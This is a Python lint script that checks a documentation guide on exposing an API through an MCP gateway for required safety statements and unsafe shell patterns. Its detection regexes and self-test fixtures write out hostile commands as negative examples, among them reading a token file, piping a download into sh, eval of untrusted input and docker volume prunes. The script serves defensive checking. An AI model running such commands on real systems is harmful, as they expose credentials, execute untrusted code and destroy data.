#!/usr/bin/env python3
"""Supported-pattern structural lint for the optional S6 API-to-MCP guide.

This is NOT a shell grammar, execution validator, or security proof. A clean
report still requires manual review of EVERY prose/code block. Only literal
forms documented by --help and exercised by --self-test are recognized.
No commands in documentation are executed; no network or credentials accessed.
"""
import argparse
import re
import sys
from pathlib import Path
from typing import List, Tuple

GUIDE = "docs/how-to/expose-an-api-to-mcp.md"
DISCLAIMER = (
    "Supported-pattern structural lint only; NOT fail-closed shell grammar or "
    "security proof. Zero findings still require manual review of EVERY block. "
    "Unsupported: variable expansion/dataflow, aliases, obfuscation, multiline "
    "shell semantics, arbitrary prose paraphrases, external includes, runtime "
    "behavior, URL/header trust provenance, and generated navigation."
)
Finding = Tuple[str, int, str]


def lint(text: str) -> List[Finding]:
    """Check bounded literal patterns and required explanatory statements."""
    findings = []  # type: List[Finding]
    lines = text.splitlines()

    def add(code: str, line: int, message: str) -> None:
        findings.append((code, line, message))

    def require(code: str, pattern: str, message: str) -> None:
        if not re.search(pattern, text, re.I | re.M):
            add(code, 1, message)

    require("optional", r"\boptional\b", "Explicitly label this continuation optional.")
    require("first-http", r"first HTTP success[^\n.]*does not require MCP", "State that first HTTP success does not require MCP.")
    require("existing-route", r"existing exposed listener[^\n.]*exact route", "Name an existing exposed listener and exact route.")
    require("publish", r"not (?:served|available)[^\n.]*before explicit publish", "State imported tools are not served before explicit publish.")
    require("list-call", r"tools/list[^\n.]*visibility[^\n.]*tools/call", "Distinguish tools/list visibility from tools/call.")
    require("descriptor", r"(?:return|returns)[^\n.]*gateway_invocation[^\n.]*not[^\n.]*backend response", "Describe gateway_invocation, not a backend response.")
    require("separate-http", r"separately execute[^\n.]*HTTP[^\n.]*Envoy", "Describe separate bounded HTTP execution via Envoy.")
    require("auth", r"management credential[^\n.]*separate[^\n.]*backend traffic auth", "Separate management credentials from backend traffic authentication.")
    require("allowlist", r"explicit local allowlisted endpoint", "Require an explicit local allowlisted endpoint.")
    require("redirects", r"never[^\n.]*automatic redirects[^\n.]*credentials", "Reject automatic redirects forwarding credentials.")
    require("cleanup", r"(?:bindings|captures)[^\n.]*block[^\n.]*unexpose", "Explain that bindings/captures can block shortcut unexpose.")
    require("stop-learning", r"stop active learning[^\n.]*supported lifecycle", "Describe stopping active learning through its supported lifecycle.")
    require("history", r"terminal capture history[^\n.]*block[^\n.]*removal", "Explain terminal capture history may still block final removal.")
    require("preserve", r"preserve existing volumes", "Explicitly preserve existing volumes.")

    # Literal negative assertions are deliberately exempt only at line start.
    # This is not inference about negation or about whether a command is safe.
    bad_claims = [
        ("backend-claim", r"tools/call (?:returns|executes) (?:the )?backend response", "Generated tools do not return CP-executed backend responses."),
        ("implicit-publish", r"(?:import automatically publishes|served immediately after import)", "Import is not explicit publication."),
        ("required-mcp", r"MCP is required for first HTTP success", "MCP is optional for first HTTP success."),
        ("universal-route", r"\b(?:all routes|all APIs|every route)\b", "Do not generalize an exact-route continuation to all routes/APIs."),
        ("auth-conflation", r"(?:use|reuse) (?:the )?management credential for backend traffic", "Do not use management credentials for backend traffic."),
        ("cleanup-claim", r"stopping (?:capture|learning) (?:removes|clears) (?:the )?(?:FK|bindings|capture history)", "Stopping learning does not remove FK/history/bindings."),
        ("scope", r"(?:new MCP tool|new provider|new execution path)", "This bounded continuation must not add tools/providers/execution paths."),
    ]
    for number, line in enumerate(lines, 1):
        if not re.match(r"\s*(?:never|do not|no)\b", line, re.I):
            for code, pattern, message in bad_claims:
                if re.search(pattern, line, re.I):
                    add(code, number, message)

    # Scan fenced blocks only for command patterns; prose examples are not
    # treated as executed commands. All fence blocks still need human review.
    in_fence = False
    fence_char = ""
    for number, line in enumerate(lines, 1):
        fence = re.match(r"\s*(`{3,}|~{3,})", line)
        if fence:
            if not in_fence:
                in_fence, fence_char = True, fence.group(1)[0]
            elif fence.group(1)[0] == fence_char:
                in_fence = False
            continue
        if not in_fence:
            continue
        patterns = [
            ("host-token", r"(?:cat|head|tail|source|\.)\s+[^\n]*(?:token|credentials|\.env)\b|(?:read_text|open)\([^\n]*(?:token|credentials|\.env)", "Do not read/source host token or credential files."),
            ("token-log", r"(?:echo|printf|print|console\.log)[^\n]*(?:TOKEN|PASSWORD|SECRET|Authorization)|set\s+-[^\s]*x|curl[^\n]*(?:--verbose|\s-v\b|--trace)", "Do not print credentials or enable credential-bearing tracing."),
            ("tls", r"curl[^\n]*(?:--insecure|\s-[A-Za-z]*k[A-Za-z]*\b)|verify\s*=\s*False|NODE_TLS_REJECT_UNAUTHORIZED\s*=\s*0", "No TLS bypass."),
            ("admin", r"(?:https?://[^\s/]+:9901\b|/config_dump\b|/quitquitquit\b|/stats\b)", "Do not use Envoy admin endpoints."),
            ("dynamic-exec", r"(?:^\s*|[;&|]\s*)eval\b|(?:curl|wget)[^\n]*\|\s*(?:sh|bash)\b|\b(?:sh|bash)\s+-c\b|shell\s*=\s*True", "No eval or untrusted shell execution."),
            ("dynamic-url", r"curl[^\n]*\$(?:\{|\()?[^\n]*(?:url|URL|descriptor|invocation)|requests\.(?:get|post)\([^\n]*(?:descriptor|invocation)", "Do not execute arbitrary descriptor-returned URLs."),
            ("redirect-command", r"curl[^\n]*(?:--location(?:-trusted)?|\s-[A-Za-z]*L[A-Za-z]*\b)|allow_redirects\s*=\s*True", "No automatic credential-forwarding redirect execution."),
            ("destructive-reset", r"docker\s+(?:system|volume)\s+prune|docker\s+compose[^\n]*down[^\n]*(?:--volumes|\s-v\b)|\bgcloud\b[^\n]*\bdelete\b", "No global/cloud prune or destructive volume reset."),
            ("readiness-mutation", r"\b(?:while|until|for)\b[^\n]*(?:publish|unexpose|delete|curl[^\n]*-X\s*(?:POST|PUT|PATCH|DELETE))", "Do not mutate in a readiness loop."),
            ("direct-backend", r"curl[^\n]*https?://(?:backend|upstream)(?::|/|\b)", "No direct backend shortcut."),
        ]
        for code, pattern, message in patterns:
            if re.search(pattern, line, re.I):
                add(code, number, message)
    # Literal sh-block shape only: Compose exec -T can consume subsequent
    # interactive-shell input. Not a general shell/clipboard parser.
    for match in re.finditer(r"```sh\n(.*?)\n```", text, re.S):
        block = match.group(1)
        calls = re.findall(r"(?:^\s*|[|;&]\s*)fp(?:\s|$)", block, re.M)
        if len(calls) > 1 and not block.lstrip().startswith("("):
            add("stdin-group", text[:match.start()].count("\n") + 1,
                "Keep multi-fp command blocks parenthesized; exec -T may consume later input.")
    if in_fence:
        add("fence", len(lines), "Unclosed fence; manually inspect block boundaries.")
    return findings


BASE = """# Optional API-to-MCP continuation
First HTTP success does not require MCP.
Bind the imported API definition to an existing exposed listener and exact route.
An imported tool is not served before explicit publish.
tools/list reports visibility; tools/call invokes the generated tool.
Generated API tools return a gateway_invocation descriptor, not a backend response.
The caller must separately execute safe bounded HTTP through the Envoy-facing URL.
Keep the management credential separate from backend traffic auth.
Use an explicit local allowlisted endpoint; never trust arbitrary returned hosts or headers.
Never use automatic redirects forwarding credentials.
Existing bindings and captures can block shortcut unexpose.
Stop active learning through the supported lifecycle.
Terminal capture history can still block final removal.
Stopping learning does not imply removal of FK or bindings.
Preserve existing volumes.
No new MCP tool, new provider, or new execution path.
"""


def self_test() -> int:
    """Paired literal fixtures: each safe example and unsafe counterpart."""
    pairs = [
        ("descriptor", BASE, BASE + "tools/call returns the backend response.\n", "backend-claim"),
        ("publish", BASE, BASE.replace("not served before explicit publish", "served immediately after import"), "publish"),
        ("optional-placement", BASE, BASE.replace("Optional", "Mandatory").replace("does not require MCP", "requires MCP"), "optional"),
        ("exact-route", BASE, BASE + "This exposes all routes.\n", "universal-route"),
        ("auth-separation", BASE, BASE + "Use the management credential for backend traffic.\n", "auth-conflation"),
        ("cleanup-conflict", BASE, BASE + "Stopping capture removes the FK.\n", "cleanup-claim"),
        ("cleanup-disclosure", BASE, BASE.replace("Terminal capture history can still block final removal.", ""), "history"),
        ("no-new-path", BASE, BASE + "Add a new execution path.\n", "scope"),
    ]
    commands = [
        ("token-read", "printf 'ready\\n'", "cat /home/operator/token", "host-token"),
        ("stdin-group", "(\nset -eu\nfp mcp status\nfp mcp tools\n)", "fp mcp status\nfp mcp tools", "stdin-group"),
        ("token-log", "printf 'ready\\n'", 'echo "$TOKEN"', "token-log"),
        ("tls", "curl https://127.0.0.1:8443/exact", "curl -k https://127.0.0.1:8443/exact", "tls"),
        ("admin", "curl http://127.0.0.1:8080/exact", "curl http://127.0.0.1:9901/config_dump", "admin"),
        ("eval", "printf 'ready\\n'", 'eval "$UNTRUSTED"', "dynamic-exec"),
        ("eval-word-in-data", "printf '%s\\n' 'hello from the flowplane eval demo upstream'", 'eval "$UNTRUSTED"', "dynamic-exec"),
        ("pipe-shell", "printf 'ready\\n'", "curl https://example.invalid/setup | sh", "dynamic-exec"),
        ("dynamic-url", "curl http://127.0.0.1:8080/exact", 'curl "$descriptor_url"', "dynamic-url"),
        ("redirect", "curl http://127.0.0.1:8080/exact", "curl -L http://127.0.0.1:8080/exact", "redirect-command"),
        ("volume", "docker compose ps", "docker compose down --volumes", "destructive-reset"),
        ("global-prune", "docker compose ps", "docker system prune", "destructive-reset"),
        ("readiness", "until curl http://127.0.0.1:8080/ready; do sleep 1; done", "until curl -X POST http://127.0.0.1:8080/publish; do sleep 1; done", "readiness-mutation"),
        ("backend", "curl http://127.0.0.1:8080/exact", "curl http://backend:9000/exact", "direct-backend"),
    ]
    for name, safe, unsafe, code in commands:
        pairs.append((name, BASE + "```sh\n" + safe + "\n```\n", BASE + "```sh\n" + unsafe + "\n```\n", code))
    passed = 0
    for name, positive, negative, expected in pairs:
        good = lint(positive)
        bad = lint(negative)
        if good or expected not in {item[0] for item in bad}:
            print("FAIL {}: positive={!r}; negative={!r}; expected={}".format(name, good, bad, expected))
            continue
        passed += 1
    import tempfile
    import io
    from contextlib import redirect_stdout
    with tempfile.TemporaryDirectory(prefix="hermes-verify-mcp-nav-") as temp:
        root = Path(temp)
        guide = root / GUIDE
        guide.parent.mkdir(parents=True)
        guide.write_text(BASE, encoding="utf-8")
        nav = root / "README.md"
        nav.write_text("[MCP](docs/how-to/expose-an-api-to-mcp.md)\n", encoding="utf-8")
        with redirect_stdout(io.StringIO()):
            positive = check_repo(root)
            nav.write_text("No guide link here.\n", encoding="utf-8")
            negative = check_repo(root)
        pairs.append(("navigation", "supported reference", "missing reference", "navigation"))
        if positive == 0 and negative != 0:
            passed += 1
        else:
            print("FAIL navigation: positive={}, negative={}".format(positive, negative))
    print("Self-test: {}/{} pairs passed ({} fixtures).".format(passed, len(pairs), len(pairs) * 2))
    print(DISCLAIMER)
    return 0 if passed == len(pairs) else 1


def check_repo(root: Path) -> int:
    guide = root / GUIDE
    if not guide.is_file():
        print("ERROR: missing " + str(guide))
        return 1
    findings = lint(guide.read_text(encoding="utf-8"))
    for code, line, message in findings:
        print("{}:{}: {}: {}".format(guide, line, code, message))
    # Known literal navigation formats only. Do not recursively read the repo.
    navigation = [root / "mkdocs.yml", root / "mkdocs.yaml", root / "docs/README.md", root / "README.md"]
    found_reference = False
    read_navigation = []
    for path in navigation:
        if path.is_file():
            read_navigation.append(str(path))
            content = path.read_text(encoding="utf-8")
            if re.search(r"(?:docs/)?how-to/expose-an-api-to-mcp\.md", content):
                found_reference = True
    if not found_reference:
        findings.append(("navigation", 0, "No literal guide reference in supported navigation; add one or manually qualify another format."))
        print("ERROR: no literal guide reference in supported navigation; other formats remain unverified.")
    print("Navigation files read: " + (", ".join(read_navigation) or "none"))
    print("Findings: {}".format(len(findings)))
    print(DISCLAIMER)
    return 1 if findings else 0


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__, epilog=DISCLAIMER)
    modes = parser.add_mutually_exclusive_group(required=True)
    modes.add_argument("--self-test", action="store_true", help="Run paired synthetic fixtures only; no repository reads.")
    modes.add_argument("--repo", type=Path, metavar="ROOT", help="Read the guide and known literal navigation files; never execute examples.")
    args = parser.parse_args()
    return self_test() if args.self_test else check_repo(args.repo)


if __name__ == "__main__":
    sys.exit(main())
